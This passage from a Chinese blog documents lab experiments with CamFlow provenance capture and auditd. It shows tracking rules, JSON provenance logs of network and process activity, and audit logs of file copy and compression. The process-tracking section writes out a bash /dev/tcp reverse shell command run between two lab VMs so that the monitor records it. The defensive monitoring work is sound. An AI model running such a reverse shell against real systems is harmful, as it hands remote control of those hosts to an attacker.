对象的版本(版本对应对象的状态)</span><br><span class="line">cf:uid user ID</span><br><span class="line">cf:gid group ID</span><br><span class="line">cf:pid 进程标识符</span><br><span class="line">cf:vpid 虚拟进程标识符</span><br><span class="line">cf:secctx 由SElinux定义的安全上下文</span><br><span class="line">cf:mode 索引节点模式</span><br><span class="line">cf:ino 索引号</span><br><span class="line">cf:uuid superblock唯一标识符</span><br><span class="line">cf:length path&#x2F;value&#x2F;name&#x2F;content属性的大小</span><br><span class="line">cf:atime 访问时间</span><br><span class="line">cf:ctime 改变时间</span><br><span class="line">cf:mtime 修改时间</span><br><span class="line">cf:truncated value&#x2F;name&#x2F;content是否被截断</span><br><span class="line">cf:content IP数据包内容值</span><br><span class="line">cf:seq IP序号</span><br><span class="line">cf:sender 数据包发送方ip地址</span><br><span class="line">cf:receiver 数据包接收方ip地址</span><br><span class="line">cf:address ip地址</span><br><span class="line">cf:pathname 路径名</span><br><span class="line">cf:value 环境&#x2F;参数变量值</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/CamFlow/camflow-dev/blob/master/docs/VERTICES.md">查看顶点属性列表</a><br>，<a href="https://github.com/CamFlow/camflow-dev/blob/master/docs/RELATIONS.md">查看边属性列表</a></p>
<p>其中file,process_memory,path为顶点属性，used,WasGeneratedBy为边属性，分析日志可得，顶点属性path中包含/usr/bin/cat和/home/supervampire/fflag等，边属性中used包含open,getattr,read等，可知使用cat /home/supervampire/fflag对fflag文件进行打开、读等操作；</p>
<p>其中可以将日志导入官方提供的 <a href="https://camflow.org/demo">可视化平台链接</a> (日志格式需要为w3c，默认为spade_json，可以在/etc/camflowd.ini中修改)，可视化效果如下(边属性因为图片大小没有清楚显示出来)：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210201105548.png" alt="20210201105548"></p>
<hr>
<h2 id="监控网络-1"><a href="#监控网络-1" class="headerlink" title="监控网络"></a>监控网络</h2><p>添加规则用于追踪ipv4入口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo camflow --track-ipv4-ingress 0.0.0.0&#x2F;0:5000</span><br><span class="line">#跟踪0.0.0.0:5000入口</span><br></pre></td></tr></table></figure>
<p>现在fedora机器上python启动http服务，打开另一台虚拟机(ip为192.168.183.128)执行curl命令访问fedora机器上的web服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.183.130:5000</span><br></pre></td></tr></table></figure>
<p>根据ip关键字定位到日志位置：(日志由于太长只截取以下关键部分，<a href="https://wxt123.top/dict/CamFlow/curl.json">完整日志点击链接</a>，同时对日志内容进行了json格式化操作，方便阅读)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;entity&quot;: &#123;</span><br><span class="line">		&quot;cf:AABAAAAAACThul9E+DhrUCAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;5794787984492444385&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;path&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 32,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T06:04:28&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294700806&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:pathname&quot;: &quot;&#x2F;usr&#x2F;bin&#x2F;python3.9&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[path] &#x2F;usr&#x2F;bin&#x2F;python3.9&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AAAIAAAAACDBEwIAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;136129&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;process_memory&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 32,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T06:04:28&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294700806&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:uid&quot;: 0,</span><br><span class="line">			&quot;cf:gid&quot;: 0,</span><br><span class="line">			&quot;cf:tgid&quot;: 2209,</span><br><span class="line">			&quot;cf:utsns&quot;: 4026531838,</span><br><span class="line">			&quot;cf:ipcns&quot;: 4026531839,</span><br><span class="line">			&quot;cf:mntns&quot;: 4026531840,</span><br><span class="line">			&quot;cf:pidns&quot;: 4026531836,</span><br><span class="line">			&quot;cf:netns&quot;: 4026531992,</span><br><span class="line">			&quot;cf:cgroupns&quot;: 4026531835,</span><br><span class="line">			&quot;cf:secctx&quot;: &quot;unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[process] 0&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:ACAAAAAAACAMFwIAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;136972&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;socket&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 32,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T06:04:28&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294700806&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:uid&quot;: 0,</span><br><span class="line">			&quot;cf:gid&quot;: 0,</span><br><span class="line">			&quot;cf:mode&quot;: &quot;0xc1ff&quot;,</span><br><span class="line">			&quot;cf:secctx&quot;: &quot;system_u:object_r:unlabeled_t:s0&quot;,</span><br><span class="line">			&quot;cf:ino&quot;: 54378,</span><br><span class="line">			&quot;cf:uuid&quot;: &quot;00000000-0000-0000-0000-000000000000&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[socket] 0&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AAACAAAAACA1TQAAwKi3gsCot4ATiMqMBgAAAP1WwoA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: 19765,</span><br><span class="line">			&quot;cf:seq&quot;: 2160219901,</span><br><span class="line">			&quot;cf:sender&quot;: &quot;192.168.183.130:5000&quot;,</span><br><span class="line">			&quot;cf:receiver&quot;: &quot;192.168.183.128:51852&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;packet&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294700806&quot;,</span><br><span class="line">			&quot;cf:len&quot;: 52992,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[packet] 192.168.183.130:5000-&gt;192.168.183.128:51852 (19765)&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AAACAAAAACA1TgAAwKi3gsCot4ATiMqMBgAAAP1Wwxs&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: 20021,</span><br><span class="line">			&quot;cf:seq&quot;: 465786621,</span><br><span class="line">			&quot;cf:sender&quot;: &quot;192.168.183.130:5000&quot;,</span><br><span class="line">			&quot;cf:receiver&quot;: &quot;192.168.183.128:51852&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;packet&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294700806&quot;,</span><br><span class="line">			&quot;cf:len&quot;: 26885,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[packet] 192.168.183.130:5000-&gt;192.168.183.128:51852 (20021)&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;wasDerivedFrom&quot;: &#123;</span><br><span class="line">		&quot;cf:AQAAAAAAgIAEAAAAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;4&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;named&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 32,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T06:04:28&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294700806&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;named&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:usedEntity&quot;: &quot;cf:AABAAAAAACThul9E+DhrUCAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:generatedEntity&quot;: &quot;cf:AAAIAAAAACDBEwIAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;136973&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AAABAAAAgIAIAAAAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;8&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;sh_read&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 32,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T06:04:28&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294700806&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;sh_read&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:usedEntity&quot;: &quot;cf:AAEAAAAAACB&#x2F;0gAAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:generatedEntity&quot;: &quot;cf:AAAIAAAAACDBEwIAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;80000d1&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;136973&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:BAAAAAAAgIAMAAAAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;12&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;send_packet&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 32,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T06:04:28&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294700806&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;send_packet&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:usedEntity&quot;: &quot;cf:ACAAAAAAACAMFwIAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:generatedEntity&quot;: &quot;cf:AAACAAAAACA1TQAAwKi3gsCot4ATiMqMBgAAAP1WwoA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;136973&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:BAAAAAAAgIANAAAAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;13&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;send_packet&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 32,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T06:04:28&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294700806&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;send_packet&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:usedEntity&quot;: &quot;cf:ACAAAAAAACAMFwIAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:generatedEntity&quot;: &quot;cf:AAACAAAAACA1TgAAwKi3gsCot4ATiMqMBgAAAP1Wwxs&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;136973&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:QAAAAAAAgIAOAAAAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;14&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;free&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 32,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T06:04:28&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294700806&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;free&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:usedEntity&quot;: &quot;cf:ACAAAAAAACAMFwIAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:generatedEntity&quot;: &quot;cf:ACAAAAAAACAMFwIAAAAAACAAAACkyYgGAQAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;136973&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析以上日志内容，顶点属性包括packet，path，socket等，边属性包括send-packet，free等，记录了网络行为，可视化结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210201141711.png" alt="20210201141711"></p>
<hr>
<h2 id="监控进程-1"><a href="#监控进程-1" class="headerlink" title="监控进程"></a>监控进程</h2><p>添加规则用于监控进程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo camflow --track-process 2311 true</span><br><span class="line">#跟踪进程2311(该进程为ncat监听本地6767端口)</span><br></pre></td></tr></table></figure>
<p>用另一台虚拟机(ip为192.168.183.128)执行反弹shell命令，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.183.130&#x2F;6767 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>根据ncat关键字定位到日志位置：(日志由于太长只截取以下关键部分，<a href="https://wxt123.top/dict/CamFlow/ncat.json">完整日志点击链接</a>，同时对日志内容进行了json格式化操作，方便阅读):</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;entity&quot;: &#123;</span><br><span class="line">		&quot;cf:AABAAAAAACQr79h+QtinGiQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;1920741546204393259&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;path&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 36,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T07:17:59&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294872563&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:pathname&quot;: &quot;&#x2F;usr&#x2F;bin&#x2F;ncat&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[path] &#x2F;usr&#x2F;bin&#x2F;ncat&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:ACAAAAAAACDVKwIAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;142293&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;socket&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 36,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T07:17:59&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294872563&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:uid&quot;: 0,</span><br><span class="line">			&quot;cf:gid&quot;: 0,</span><br><span class="line">			&quot;cf:mode&quot;: &quot;0xc1ff&quot;,</span><br><span class="line">			&quot;cf:secctx&quot;: &quot;system_u:object_r:unlabeled_t:s0&quot;,</span><br><span class="line">			&quot;cf:ino&quot;: 56809,</span><br><span class="line">			&quot;cf:uuid&quot;: &quot;00000000-0000-0000-0000-000000000000&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[socket] 0&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AAAIAAAAACDlHgIAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;138981&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;process_memory&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 36,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T07:17:59&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294872563&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:uid&quot;: 1000,</span><br><span class="line">			&quot;cf:gid&quot;: 1000,</span><br><span class="line">			&quot;cf:tgid&quot;: 2311,</span><br><span class="line">			&quot;cf:utsns&quot;: 4026531838,</span><br><span class="line">			&quot;cf:ipcns&quot;: 4026531839,</span><br><span class="line">			&quot;cf:mntns&quot;: 4026531840,</span><br><span class="line">			&quot;cf:pidns&quot;: 4026531836,</span><br><span class="line">			&quot;cf:netns&quot;: 4026531992,</span><br><span class="line">			&quot;cf:cgroupns&quot;: 4026531835,</span><br><span class="line">			&quot;cf:secctx&quot;: &quot;unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[process] 0&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;used&quot;: &#123;</span><br><span class="line">		&quot;cf:CAAAAAAAIIABAAAAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;1&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;accept&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 36,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T07:17:59&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294872563&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;accept&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:entity&quot;: &quot;cf:ACAAAAAAACDVKwIAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEDkHgIAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;138980&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:IAAAAAAAIIAGAAAAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;6&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;receive_msg&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 36,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T07:17:59&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294872689&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;receive_msg&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:entity&quot;: &quot;cf:ACAAAAAAACDVKwIAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEDkHgIAAAAAACQAAACkyYgGAQAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;40&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;138980&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;wasDerivedFrom&quot;: &#123;</span><br><span class="line">		&quot;cf:AQAAAAAAgIAEAAAAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;4&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;named&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 36,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T07:17:59&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294872563&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;named&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:usedEntity&quot;: &quot;cf:AABAAAAAACQr79h+QtinGiQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:generatedEntity&quot;: &quot;cf:AAAIAAAAACDlHgIAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;138980&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析以上日志，顶点属性有socket，process_memory，path等，边属性有receive_msg，accept(socket accept)等，说明两个虚拟机之间建立了socket通信，可视化结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210201153127.png" alt="20210201153127"></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>系统监控</tag>
      </tags>
  </entry>
  <entry>
    <title>audit+camflow实验</title>
    <url>/2021/02/01/audit+camflow%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<h1 id="Auditd测试"><a href="#Auditd测试" class="headerlink" title="Auditd测试"></a>Auditd测试</h1><ul>
<li>测试目标：拷贝，压缩</li>
<li>测试环境：C，Python，命令行，图形界面</li>
<li><a href="https://wxt123.top/dict/Auditd/">测试脚本源码地址链接</a><a id="more"></a>
</li>
</ul>
<hr>
<h2 id="C"><a href="#C" class="headerlink" title="C"></a>C</h2><p><strong>拷贝：</strong></p>
<ul>
<li>添加规则：<code>sudo auditctl -w /home/supervampire/桌面/C/a.txt -p rwxa -F key=ccopy</code></li>
<li>拷贝命令：<code>./copy a.txt aa.txt</code></li>
<li>查看日志：<code>sudo ausearch -i -k ccopy</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:09:43.146:250) : proctitle&#x3D;.&#x2F;copy a.txt aa.txt </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:09:43.146:250) : item&#x3D;0 name&#x3D;a.txt inode&#x3D;394627 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年02月02日 10:09:43.146:250) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:09:43.146:250) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;3 a0&#x3D;0xffffff9c a1&#x3D;0x7fffe995621a a2&#x3D;O_RDWR a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;3983 pid&#x3D;4117 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;copy exe&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C&#x2F;copy subj&#x3D;unconfined key&#x3D;ccopy </span><br></pre></td></tr></table></figure></li>
<li>*压缩：**</li>
<li>添加规则：<code>sudo auditctl -w /home/supervampire/桌面/C/b.txt -p rwxa -F key=czip</code></li>
<li>压缩命令：<code>./minizip bb.zip b.txt</code></li>
<li>查看日志：<code>sudo ausearch -i -k czip</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:20:14.528:323) : proctitle&#x3D;.&#x2F;minizip b.zip b.txt </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:20:14.528:323) : item&#x3D;0 name&#x3D;b.txt inode&#x3D;394641 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年02月02日 10:20:14.528:323) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:20:14.528:323) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;4 a0&#x3D;0xffffff9c a1&#x3D;0x7fff48d0821b a2&#x3D;O_RDONLY a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;3983 pid&#x3D;4300 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;minizip exe&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C&#x2F;minizip subj&#x3D;unconfined key&#x3D;czip </span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p><strong>拷贝：</strong></p>
<ul>
<li>添加规则：<code>sudo auditctl -w /home/supervampire/桌面/C/c.txt -p rwxa -F key=pcopy</code></li>
<li>拷贝命令：<code>python copy.py</code></li>
